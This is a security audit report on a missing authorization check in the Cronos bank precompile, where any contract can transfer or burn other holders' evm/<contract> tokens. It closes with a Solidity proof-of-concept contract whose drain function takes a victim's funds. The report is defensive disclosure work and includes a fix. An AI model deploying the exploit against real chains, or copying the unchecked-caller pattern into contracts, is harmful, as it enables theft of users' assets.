### Title
Unauthorized Transfer and Burn of Native Tokens via Missing Caller Authorization in Bank Precompile — (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` and `burn` methods accept an arbitrary source address from calldata without verifying that the calling contract is authorized to act on behalf of that address. Any deployed contract can drain or destroy `evm/<itself>` native bank-module tokens from any holder without the holder's consent.

### Finding Description
In `BankContract.Run`, the `TransferMethodName` and `BurnMethodName` cases both derive the **denom** from `contract.Caller()` (correct — only the calling contract's own denom is affected), but derive the **source address** for the bank operation directly from calldata arguments with no authorization check:

**`burn` path** — `args[0]` is the address to burn *from*:
```go
recipient := args[0].(common.Address)   // named "recipient" but is the burn source
addr := sdk.AccAddress(recipient.Bytes())
// No check: contract.Caller() == recipient
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
``` [1](#0-0) 

**`transfer` path** — `args[0]` is the address to transfer *from*:
```go
sender := args[0].(common.Address)   // from calldata, not verified
from := sdk.AccAddress(sender.Bytes())
// No check: contract.Caller() == sender
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [2](#0-1) 

The intended usage pattern (from `TestBank.sol`) passes `msg.sender` as the source address, but the precompile never enforces this constraint:
```solidity
bank.burn(msg.sender, amount);          // intended
bank.transfer(msg.sender, recipient, amount);  // intended
```
A malicious contract can instead pass any victim address as the source.

This is structurally analogous to the beacon-kit bug: one value (the denom, derived from `contract.Caller()`) is correctly bound to a trusted source, but the correlated value (the source address for the bank operation) is taken from attacker-controlled calldata with no cross-validation.

### Impact Explanation
**Critical — Unauthorized burn and transfer of precompile-controlled assets.**

`evm/<contract>` tokens are native bank-module tokens. Users convert ERC20 tokens to this native form via `moveToNative` (burning ERC20, minting native). Once a user holds `evm/<attackerContract>` tokens, the attacker contract can:
1. Call `bank.transfer(victimAddress, attackerAddress, amount)` — silently drains the victim's native tokens.
2. Call `bank.burn(victimAddress, amount)` — destroys the victim's native tokens without returning the underlying ERC20 value.

Both operations succeed because the bank module performs no authorization check beyond module-level minting rights; the precompile is the sole gatekeeper and it fails to enforce caller identity.

### Likelihood Explanation
Any unprivileged user can deploy a contract on Cronos EVM. The attacker deploys a contract that appears legitimate (e.g., a yield protocol), induces users to call `moveToNative` (converting their ERC20 tokens to `evm/<attackerContract>` native tokens), then calls `bank.transfer` or `bank.burn` to drain all holders in a single transaction. No admin keys, governance, or validator compromise is required.

### Recommendation
In both the `BurnMethodName` and `TransferMethodName` cases, add a check that the source address equals `contract.Caller()`:

```go
// For burn:
if recipient != contract.Caller() {
    return nil, errors.New("burn: caller is not the token holder")
}

// For transfer:
if sender != contract.Caller() {
    return nil, errors.New("transfer: caller is not the sender")
}
```

Alternatively, remove the `sender`/`recipient` argument entirely and derive the source address from `contract.Caller()`, consistent with how `denom` is already derived.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract MaliciousBank {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Mint evm/<this> tokens to victim (e.g., as a "reward")
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: Drain victim's evm/<this> tokens — no victim consent required
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
        // OR: bank.burn(victim, amount) to destroy without returning ERC20 value
    }
}
```

After `seedVictim(victim, 1000)`, calling `drain(victim, attacker, 1000)` succeeds and transfers all `evm/<MaliciousBank>` tokens from the victim to the attacker. The victim has no recourse and no approval was required.
